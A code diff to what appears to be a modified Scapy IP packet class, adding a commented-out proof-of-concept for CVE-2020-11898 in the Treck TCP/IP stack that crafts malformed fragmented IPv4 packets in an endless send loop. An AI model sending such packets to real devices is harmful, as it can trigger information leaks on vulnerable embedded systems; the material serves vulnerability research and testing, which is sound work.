@@ -613,6 +613,22 @@ class IP(Packet, IPTools):
 #https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11898
     #The Treck TCP/IP stack before 6.0.1.66 improperly handles an IPv4/ICMPv4 Length Parameter Inconsistency, 
     #which might allow remote attackers to trigger an information leak. 
+    
+    ##! /usr/bin/env python3
+    #from scapy.all import *
+    #    while True:
+    #        target="127.0.0.1"
+    #
+    #        innerPayload = "\x00"*40 + "\x41"*100 # as described in JSOF's whitepaper 
+    #        innerPayload = "\x00"*40 + "\x41"*1
+    #        innerPacket = IP(ihl=0xf, len=100, proto=0, dst=target)
+    #        innerPacket.add_payload(innerPayload.encode("ascii"))
+    #
+    #        outerPacket = IP(dst=target,id=0xabcd)/innerPacket
+    #        frags = fragmentCustom(outerPacket)
+    #        for f in frags:
+    #            send(f)
+    #
 
 def fragmentCustom(self):
     """
